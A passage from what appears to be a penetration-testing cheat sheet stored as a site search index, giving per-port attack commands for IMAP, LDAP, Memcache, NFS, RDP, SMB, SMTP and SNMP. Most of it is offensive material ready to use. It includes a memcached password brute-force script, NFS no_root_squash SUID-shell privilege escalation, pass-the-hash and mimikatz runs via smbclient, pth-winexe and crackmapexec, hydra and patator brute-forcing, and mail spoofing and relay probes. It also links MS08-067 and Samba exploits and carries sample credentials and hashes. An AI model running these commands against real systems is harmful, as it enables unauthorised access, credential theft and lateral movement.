- en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword Capability: a capability Retrieving Emails and Modifying the Inbox Namespaces: n namespace Examine Inbox: ex1 EXAMINE INBOX List of folders LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Fetch Messages f1 FETCH 1 BODY [] f2 fetch 2 RFC822 f3 fetch 1 : 4 ( BODY [ HEADER . FIELDS ( Subject )]) Unseen s search UNSEEN Delete d store 2 + FLAGS ( \\ Deleted ) e expunge Example Session 1 \\ . telnet brainfuck . htb 143 2 \\ . a1 LOGIN orestis kHGuERB29DNiNE 3 \\ . a2 LIST * 4 \\ . a3 EXAMINE INBOX 5 \\ . a4 FETCH 1 BODY [] 6 \\ . a5 FETCH 2 BODY [] Tools Hardening References","title":"IMAP - 134/tcp 993/tcp"},{"location":"ports-and-protocols/#irc-8067tcp","text":"Quick Reference Version / Connect irssi -c 10 .10.10.117 --port 8067","title":"IRC - 8067/tcp"},{"location":"ports-and-protocols/#ldap-389tcp","text":"Quick Reference Configuration files containers . ldif ldap . cfg ldap . conf ldap . xml ldap - config . xml ldap - realm . xml slapd . conf Brute-forcing: nmap - p 389 --script ldap-brute --script-args ldap.base= cn=schema,dc=targetbox,dc=target (TARGET IP ADDRESS) -vv Dump: ldapdomaindump - u example \\ example 10 . 10 . 10 . 10 ldapsearch - LLL - x - H ldap : // domain - b - s base (objectclass=*) ldapsearch - LLL - x - H ldap : // domain - b - s base CN=example,DC=LOCAL ldapsearch - h EGOTISTICAL - BANK . LOCAL - p 389 - x - b DC=EGOTISTICAL-BANK,DC=LOCAL http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html Tools Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool Hardening References","title":"LDAP - 389/tcp"},{"location":"ports-and-protocols/#memcache","text":"Quick Reference Connecting: telnet localhost 11211 Information gathering nmap - p 11211 --script memcached-info memcstat --servers=127.0.0.1 Read value memccat --servers = 192 .64.38.3 --username = user --password = pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END Key information and dump values version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [ 6 b ; 1256056128 s ] END Increment decrement incr id 1 decr id 1 Set new entry set phone 0 60 9 123456789 Modify value replace key 0 0 2 new - value prepend address 0 0 6 house append address 0 0 6 , 73301 Delete delete old_address flush_all 30 # invalidate all keys after 30 s Dump all keys memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst Dump all key-values memcached-tool localhost:11211 dump | less while read -r key ; do [ -f $key ] || echo get $key | nc localhost 11211 $key .dump ; done ( memcdump --server localhost ) memcdump --servers = localhost | xargs -L1 -I% sh -c echo get % | nc localhost 11211 memcmd function memcmd () { exec { memcache } /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${ memcache } cat ${ memcache } } 1.4.31 and above memcmd lru_crawler metadump all 1.4.30 and below memcmd stats items memcmd stats cachedump 1 0 for id in $( memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu ) ; do memcmd stats cachedump $id 0 done Tools Python Library: https://github.com/abstatic/python-memcached-stats Bruteforce #!/usr/bin/python3 import subprocess dictionary = open ( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary : out = subprocess . getoutput ( memcstat --servers=192.64.38.3 --username=student --password= + pwd ) if len ( out ) 0 : print ( out ) print ( PASSWORD: + pwd ) break Hardening References","title":"Memcache"},{"location":"ports-and-protocols/#modbus-502tcp","text":"Quick Reference Tools Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt Hardening References","title":"Modbus - 502/tcp"},{"location":"ports-and-protocols/#nfs-2049tcp","text":"Quick Reference Configuration files / etc / exports / etc / lib / nfs / xtab Enumeration nmap -sV --script = nfs-* 192 .168.44.133 nmap -sV --script = nfs-ls 192 .168.44.133 //same result as rpcinfo nmap -sV --script = nfs-* 192 .168.44.133 Enumerate NFS shares: showmount - e hostname / ip_address Mount NFS shares: mount -t nfs ip_address:/directory_found_exported /local_mount_point mount -t nfs 192 .168.1.72:/home/vulnix /tmp/mnt -nolock / etc / exports file contains configurations and permissions of which folders/file systems are exported to remote users Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user \"nfsnobody\" when connected. https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/ no_root_squash - Gives the remote user root access to the connected system With limited user account: cp / bin / bash / shared Then mount the share: mount - t nfs server : / shared / mnt / and run chown root : root bash chmod u + s bash Run the file with limited user account: / shared / bash Tools NFS shell - https://github.com/NetDirect/nfsshell Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts. nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example Hardening References http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm","title":"NFS - 2049/tcp"},{"location":"ports-and-protocols/#ntp-123tcp","text":"Quick Reference Configuration files ntp . conf Tools ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source ntpdc - Query the ntp Deamon about its current state and to request changes in the state ntpdc - c monlist IP_ADDRESS ntpdc - c sysinfo IP_ADDRESS ntpq - Monitors NTP daemon ntpd operations and determine performance Hardening NTPSec IPTables logging References","title":"NTP - 123/tcp"},{"location":"ports-and-protocols/#pop3-110tcp","text":"Quick Reference Login USER username PASS password Other commands Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body Tools Hardening References","title":"POP3 - 110/tcp"},{"location":"ports-and-protocols/#pptp-l2tp-vpn-500tcp-1723tcp","text":"Quick Reference Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf","title":"PPTP-L2TP-VPN - 500/tcp 1723/tcp"},{"location":"ports-and-protocols/#rdp-3389tcp","text":"Quick Reference PTH: xfreerdp / u : testing / d : thinc / pth : 31 d6cfe0d16ae931b73c59d7e0c089c0 / v : 192 . 168 . 1 . 23 Tools List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History Hardening References RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","title":"RDP - 3389/tcp"},{"location":"ports-and-protocols/#rlogin-513tcp","text":"Quick Reference Locating files find / - name . rhosts locate . rhosts Manual login: rlogin hostname - l username Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html","title":"rlogin - 513/tcp"},{"location":"ports-and-protocols/#smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp","text":"","title":"SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp"},{"location":"ports-and-protocols/#quick-reference","text":"","title":"Quick Reference"},{"location":"ports-and-protocols/#summary","text":"Summary In computer networking, Server Message Block ( SMB ) , one version of which was also known as Common Internet File System ( CIFS ) , operates as an application - layer network protocol . Mainly used for providing shared access to files , printers , and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter - process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as \" Microsoft Windows Network \" before the subsequent introduction of Active Directory . Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component). SMB can run on top of the session (and lower) network layers in several ways: Directly over TCP , port 445 via the NetBIOS API , which in turn can run on several transports. On UDP ports 137 , 138 TCP ports 137 , 139 ( NetBIOS over TCP / IP ); On several legacy protocols such as NBF , IPX / SPX . The SMB Inter-Process Communication ( IPC ) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client first connects to an SMB server. Ports netbios-ns 137 / tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137 / udp . netbios-dgm 138 / tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138 / udp . netbios-ssn 139 / tcp # (NBT over IP) NETBIOS session service netbios-ssn 139 / udp . microsoft-ds 445 / tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS)","title":"Summary"},{"location":"ports-and-protocols/#version","text":"Version enumeration auxiliary / scanner / smb / smb_version Server Message Block (SMB) Versions SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016 Samba Version Enumeration #!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ] ; then echo Usage: ./smbver.sh RHOST {RPORT} exit ; else rhost = $1 ; fi if [ ! -z $2 ] ; then rport = $2 ; else rport = 139 ; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d . | grep -oP UnixSamba.*[0-9a-z] | tr -d \\n echo -n $rhost : echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1","title":"Version"},{"location":"ports-and-protocols/#scanning","text":"References: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap nmap ls -lh /usr/share/nmap/scripts/smb* nmap --script safe -p445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139 ,446 $ip --open nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139 ,445 --script vuln $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010check-vulns --script-args = unsafe = 1 $ip smb-vuln-conficker smb-vuln-cve2009-3103 smb-vuln-ms06-025 smb-vuln-ms07-029 smb-vuln-regsvc-dos smb-vuln-ms08-067 nmap --script smb-brute.nse -p445 ( TARGET IP ADDRESS ) nmap -p 139 .445 --script smb-enum-users ( TARGET IP ADDRESS )","title":"Scanning"},{"location":"ports-and-protocols/#enable-disable-status","text":"Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and Windows Server 2012 R2 2016: PowerShell methods SMB v1 Detect: Get - WindowsFeature FS - SMB1 Disable: Disable - WindowsOptionalFeature - Online - FeatureName smb1protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName smb1protocol SMB v2/v3 Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 8.1 and Windows 10: PowerShell method SMB v1 Protocol Detect: Get - WindowsOptionalFeature \u2013 Online \u2013 FeatureName SMB1Protocol Disable: Disable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol SMB v2/v3 Protocol Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ true Windows 8 and Windows Server 2012 SMB v1 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set - SmbServerConfiguration - EnableSMB1Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB1Protocol $ true SMB v2/v3 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008 SMB v1 on SMB Server Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get - Item HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 1 \u2013 Force SMB v2/v3 on SMB Server Detect: Get - ItemProperty HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 1 \u2013 Force Disable SMB Client SMB v1 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start = auto SMB v2/v3 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start = auto","title":"Enable / Disable / Status"},{"location":"ports-and-protocols/#other","text":"NetBIOS suffixes For unique names: 00 : Workstation Service ( workstation name ) 03 : Windows Messenger service 06 : Remote Access Service 20 : File Service ( also called Host Record ) 21 : Remote Access Service client 1 B : Domain Master Browser \u2013 Primary Domain Controller for a domain 1 D : Master Browser For group names: 00 : Workstation Service ( workgroup / domain name ) 1 C : Domain Controllers for a domain 1 E : Browser Service Elections User enumerate: scanner / smb / smb_lookupsid Bruteforcing: auxiliary/scanner/smb/smb_login while read USER ; do echo $USER smbmap -H 10 .10.10.172 -u $USER -p $USER ; done userslist patator smb_login host = 10 .121.1.33 domain = CONTOSO user = COMBO00 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -l smb_brute patator smb_login host = FILE0 domain = CONTOSO.LOCAL user = COMBO10 password = COMBO11 0 = /root/oscp/lab-net2019/smb-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u201dSTATUS_LOGON_FAILURE\u201d \u2013timeout 100 \u2013threads = 2 \u2013rate-limit = 2 Mount SMB share sudo apt-get install cifs-utils mkdir /mnt/ $shareName mount -t cifs // $ip / $shareName /mnt/ $shareName -o username = $username ,password = $password ,domain = $domain mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username = root,workgroup = WORKGROUP mount -t cifs //10.10.10.134/backups /mnt/share -o user = ,password = net use X : \\\\ server \\ sharename / USER : domain \\ username password / PERSISTENT : YES Null Session Enumeration (enabled by default in SMB1) net use \\\\ 192 . 168 . 1 . 1 \\ ipc$ / u : net view \\\\ ip_address rpcclient -U ip ( give empty password ) srvinfo enumdomusers getdompwinfo Use UpTime to guess patch level: https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172 .16.80.10 Samba Configuration Files / etc / samba / smb . conf smb . conf lmhosts Test reload configuration testparm - v service smb restart User creation: smbpasswd - a username","title":"Other"},{"location":"ports-and-protocols/#tools","text":"nmblookup Query NetBIOS names and map them to IP addresses in a network Using NetBIOS over TCP/IP queries nmblookup - A $ ip nbtscan Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ ip / 24 nbtstat nbtstat $ ip nbtscan - \u2010 r $ ip / 24 nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses. nbtstat -n: displays the names that have been registered locally on the system. nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server. nbtstat -R: purges and reloads the remote cache name table. nbtstat -RR: sends name release packets to WINs and then starts Refresh. nbtstat -s: lists the current NetBIOS sessions and their status, including statistics. nbtstat -S: lists sessions table with the destination IP addresses. SMBMap - enumerate samba share drives across an entire domain Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -d workgroup -H $ip smbmap -u -p -d workgroup -H $ip smbmap -u guest -p -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive smbmap -u -p -H 192 .168.1.23 # similar to crackmapexec --shares smbmap -u guest -p -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -r # list top level dir smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -R # list everything recursively smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -s wwwroot -R -A .* # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192 .168.1.23 -x whoami # no work Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups . xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q Using hash: mbmap.py -u user123 -p aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B -H ( TARGET IP ADDRESS ) smbclient https://www.samba.org/samba/docs/current/man-html/smbclient.1.html Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient // 192 . 168 . 1 . 23 / wwwroot smbclient // 192 . 168 . 1 . 23 / C $ WIN20082017 - U Administrator smbclient // 192 . 168 . 1 . 23 / C $ A433F6C2B0D8BB92D7288ECFFACFC7CD - U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash smbclient - L \\\\ WIN7 \\ IPC$ - I 192 . 168 . 13 . 218 smbclient \\\\ 192 . 168 . 13 . 236 \\ some - share - o user = root , pass = root , workgroup = BOB smbclient - L $ ip - U guest - p 445 smbclient - L $ ip - U $ username - p 445 password : prompt smbclient - L // server / share smbclient - L // server / share password options Null session: smbclient - N - L ( TARGET IP ) - m SMB2 Null session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - m SMB2 User session mount: smbclient \\\\\\\\(TARGET IP)\\\\IPC\\$\\\\ - N - U ( USER ) - m SMB2 Kerberos Auth: smbclient --kerberos //ws01win10.domain.com/C$ Pass the hash: smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\\\\\(TARGET IP ADDRESS)\\\\(TARGET SHARE)\\\\ (NTLM HASH) Upload file: smbclient // 192 . 168 . 31 . 142 / ADMIN $ - U nobody % somepassword - c put 40280.py Pass-the-hash: smbclient - U testuser % nthash --pw-nt-hash -L 192.168.0.1 smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ domain - U testuser % nthash --pw-nt-hash Map drives: smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ smbclient \\\\\\\\ 192 . 168 . 0 . 1 \\\\ sharename$ - U root % Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient smbclient \\10.11.1.220\\SYSVOL - U = contoso/jane%SuperPassword^ - c prompt OFF;recurse ON;lcd . / ;mget * smb : \\ RECURSE ON smb : \\ PROMPT OFF smb : \\ mget * mask recurse ON prompt OFF cd path\\to\\remote\\dir lcd ~/path/to/download/to/ mget * rpcclient Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient - U - N 192 . 168 . 1 . 102 User session: rpcclient - U htb \\\\ james mantis . htb . local Kerberos Auth rpcclient - k ws01win10 . domain . com Querying: rpcclient $ srvinfo # operating system version rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID ( suffix of SID ) rpcclient $ queryuser 0 x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james rpcclient $ netshareenumall # enumerate all shares and its paths rpcclient $ enumdomusers # enumerate usernames defined on the server rpcclient $ getdompwinfo # smb password policy configured on the server Change password: setuserinfo2 administrator 23 \u2018 password1234 \u2019 Lookup SID: lookupnames administrator rpcdump.py rpcdump . py username : password @IP_Address port / protocol ( i . e . 80 / HTTP ) rpcinfo rpcinfo [ options ] IP_Address Enum4linux Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux - a $ip enum4linux - U $ip - RID cycling ( When RestrictAnonymous is set to 1 on Windows 2000 ) - User listing ( When RestrictAnonymous is set to 0 on Windows 2000 ) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval pth-winexe pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd # using a plaintext password pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # domain user pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash + empty lm hash # or export SMBHASH = aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 pth-winexe -U Administrator% //192.168.1.23 cmd nullinux https://github.com/m8r0wn/nullinux python3 nullinux.py -users -quick DC1.Domain.net python3 nullinux.py -all 192 .168.0.0-5 python3 nullinux.py -shares -U Domain\\User -P Password1 10 .0.0.1,10.0.0.5 acccheck Password attacks acccheck - v - t $ ip - u user - P password_file mblookup NetBIOS over TCP/IP client used to lookup NetBIOS names CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) -u username -H LMHASH:NTHASH crackmapexec smb target ( s ) -u username -H NTHASH crackmapexec -u guest -p --shares 192 .168.1.23 crackmapexec -u guest -p --rid-brute 4000 192 .168.1.23 crackmapexec -u guest -p --users 192 .168.1.23 crackmapexec smb 192 .168.1.0/24 -u Administrator -p P@ssw0rd crackmapexec smb 192 .168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192 .168.1.0/24 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192 .168.1.23 crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192 .168.1.23 # reliable pth code execution Smbexec https://github.com/brav0hax/smbexec wmiexec https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py . / wmiexec . py - hashes ntlmhash Administrator @10.10.0.1 SuperScan Hyena Winfingerprint NetBIOS enumerator","title":"Tools"},{"location":"ports-and-protocols/#vulnerabilities","text":"Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit / windows / smb / ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit / windows / smb / ms08_067_netapi","title":"Vulnerabilities"},{"location":"ports-and-protocols/#hardening","text":"","title":"Hardening"},{"location":"ports-and-protocols/#references","text":"NetBios https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2 nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html","title":"References"},{"location":"ports-and-protocols/#smtp-25tcp","text":"Quick Reference Connect: nc - \u2010 nv 192 . 168 . 11 . 215 25 Configuration files sendmail . cf submit . cf User enumeration with: \"VRFY\", \"EXPN\" \"RCPT\" commands: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10 .11.1.22 VRFY username ( verifies if username exists - enumeration of accounts ) EXPN username ( verifies if username is valid - enumeration of accounts ) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $( cat users.txt ) ; do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done Mail Spoofing: http://0daysecurity.com/penetration-testing/enumeration.html HELO anything MAIL FROM : spoofed_address RCPT TO : valid_mail_account DATA . QUIT Mail Relay HELO anything Identical to / from - mail from : nobody @ domain rcpt to : nobody @ domain Unknown domain - mail from : user @ unknown_domain Domain not present - mail from : user @ localhost Domain not supplied - mail from : user Source address omission - mail from : rcpt to : nobody @ recipient_domain Use IP address of target server - mail from : user @ IP_Address rcpt to : nobody @ recipient_domain Use double quotes - mail from : user @ domain rcpt to : user@recipent-domain User IP address of the target server - mail from : user @ domain rcpt to : nobody @ recipient_domain @[ IP Address ] Disparate formatting - mail from : user @[ IP Address ] rcpt to : @ domain : nobody @ recipient - domain Disparate formatting2 - mail from : user @[ IP Address ] rcpt to : recipient_domain ! nobody @[ IP Address ] http://0daysecurity.com/penetration-testing/enumeration.html Sending a mail HELO my . server . com MAIL FROM : RCPT TO : DATA From : Danny Dolittle To : Sarah Smith Subject : Email sample Mime - Version : 1 . 0 Content - Type : text / plain ; charset=us-ascii This is a test email for you to read . . QUIT Brute-forcing: hydra ( TARGET IP ADDRESS ) smtp - l ( USERNAME ) - P / path / to / wordlist . txt - V - s ( TARGET PORT ) Other commands Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify Tools smtp_enum: auxiliary / scanner / smtp / smtp_enum smtp-enum-users.nse: nmap \u2013 script smtp - enum - users . nse 172 . 16 . 212 . 133 Hardening References","title":"SMTP - 25/tcp"},{"location":"ports-and-protocols/#snmp-161udp","text":"Quick Reference Baed on UDP - Can be suspectable for IP spoofing and replay 1,2,2c versions are plain text Week auth and default community strings (public, default) Devices often support configuration file read and write through private SNMP community string access. Hence having access to private string means router configuration can be altered. Configuration Files snmp . conf snmpd . conf snmp - config . xml SNMP - Management Information Base (MBI) Tree database related to network management. http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm commuity strings - public / private / manager / ... Scanning nmap - sU - p 161 --open ip nmap - sU - p 161 --script=*snmp* 192.168.1.200 xprobe2 - v - p udp : 161 : open 192 . 168 . 1 . 200 auxiliary / scanner / snmp / snmp_login auxiliary / scanner / snmp / snmp_enum Default community strings public private cisco cable - docsis ILMI Important Properties: Windows NT .1.3.6.1.2.1.1.5 Hostnames .1.3.6.1.2.1.4.34.1.5.2.16 IPv6 Address .1.3.6.1.4.1.77.1.4.2 Domain Name .1.3.6.1.4.1.77.1.2.25 Usernames 